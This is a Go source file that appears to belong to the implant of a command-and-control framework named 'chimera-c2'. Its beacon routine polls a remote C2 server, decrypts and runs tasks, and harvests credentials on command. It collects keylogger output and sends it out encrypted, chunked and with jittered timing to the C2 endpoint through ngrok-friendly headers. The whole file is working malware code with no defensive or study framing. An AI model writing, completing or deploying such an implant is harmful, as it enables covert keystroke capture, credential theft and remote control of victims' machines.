package main

import (
	"bytes"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"io"
	"math/big"
	"net/http"
	"os"
	"strconv"
	"time"

	"github.com/terancebana/chimera-c2/implant/internal/common"
)

func beacon() {
	if common.C2Address == "" {
		common.C2Address = common.ResolveC2()
		if common.C2Address == "" {
			return
		}
	}
	client := &http.Client{Timeout: 30 * time.Second, Transport: common.C2Transport}

	req, err := http.NewRequest("GET", common.Endpoint("beacon"), nil)
	if err != nil {
		common.C2Address = ""
		return
	}
	common.ProfileHeaders(req)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", common.AgentID)

	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Conn Error")
		common.C2Address = ""
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode == 200 {
		bodyBytes, err := io.ReadAll(resp.Body)
		if err != nil {
			queueError("beacon_read")
			return
		}
		encryptedTask := string(bodyBytes)
		decryptedJson, err := common.Decrypt(encryptedTask)
		if err != nil {
			queueError("beacon_decrypt")
			return
		}

		var task Task
		json.Unmarshal([]byte(decryptedJson), &task)

		KEYLOG_MUTEX.Lock()
		var keylogs string
		if KEYLOG_BUFFER.Len() > 0 {
			keylogs = KEYLOG_BUFFER.String()
			KEYLOG_BUFFER.Reset()
		}
		KEYLOG_MUTEX.Unlock()

		if task.Type == "harvest" {
			harvestCredentials()
			if keylogs != "" {
				res := Result{Type: "keylog", Data: keylogs}
				res = attachErrors(res)
				jsonResult, err := json.Marshal(res)
				if err == nil {
					encryptedResult, err := common.Encrypt(string(jsonResult))
					if err == nil {
						postResult(encryptedResult)
					}
				}
			}
		} else {
			result := handleTask(task)
			if keylogs != "" {
				result.Keylogs = keylogs
			}
			result = attachErrors(result)
			jsonResult, err := json.Marshal(result)
			if err != nil {
				queueError("beacon_marshal")
				return
			}
			encryptedResult, err := common.Encrypt(string(jsonResult))
			if err != nil {
				queueError("beacon_encrypt")
				return
			}
			postResult(encryptedResult)
		}

		if task.Type == "uninstall" {
			common.ReleaseMutex()
			os.Exit(0)
		}
	} else if resp.StatusCode == 204 {
		fmt.Print(".")
	}
}

func sendErrorLog(msg string) {
	result := Result{Type: "text", Data: msg}
	result = attachErrors(result)
	jsonResult, err := json.Marshal(result)
	if err != nil {
		queueError("sendlog_marshal")
		return
	}
	encryptedResult, err := common.Encrypt(string(jsonResult))
	if err != nil {
		queueError("sendlog_encrypt")
		return
	}
	postResult(encryptedResult)
}

func postResult(encryptedData string) {
	client := &http.Client{Timeout: 30 * time.Second, Transport: common.C2Transport}
	maxBytes := common.PROFILE.MaxBodyKB * 1024
	if maxBytes <= 0 {
		maxBytes = 256 * 1024
	}

	if len(encryptedData) <= maxBytes {
		postChunk(client, encryptedData, 0, 1)
		return
	}

	total := (len(encryptedData) + maxBytes - 1) / maxBytes
	for i := 0; i < len(encryptedData); i += maxBytes {
		end := i + maxBytes
		if end > len(encryptedData) {
			end = len(encryptedData)
		}
		postChunk(client, encryptedData[i:end], i/maxBytes, total)
	}
}

func postChunk(client *http.Client, chunk string, idx, total int) {
	req, err := http.NewRequest("POST", common.Endpoint("result"), bytes.NewBufferString(chunk))
	if err != nil {
		queueError("post_req")
		return
	}
	common.ProfileHeaders(req)
	req.Header.Set("ngrok-skip-browser-warning", "true")
	req.Header.Set("X-Agent-ID", common.AgentID)
	if total > 1 {
		req.Header.Set("X-Chunk-Index", strconv.Itoa(idx))
		req.Header.Set("X-Chunk-Total", strconv.Itoa(total))
	}
	client.Do(req)
}

func sleepWithJitter() {
	min := common.PROFILE.Sleep.MinSeconds
	max := common.PROFILE.Sleep.MaxSeconds
	if max < min {
		max = min
	}
	span := max - min

	secs := min
	if span > 0 {
		n, err := rand.Int(rand.Reader, big.NewInt(int64(span)+1))
		if err == nil {
			secs = min + int(n.Int64())
		}
	}
	m, _ := rand.Int(rand.Reader, big.NewInt(1000))
	drift := time.Duration(m.Int64()) * time.Millisecond
	time.Sleep(time.Duration(secs)*time.Second + drift)
}
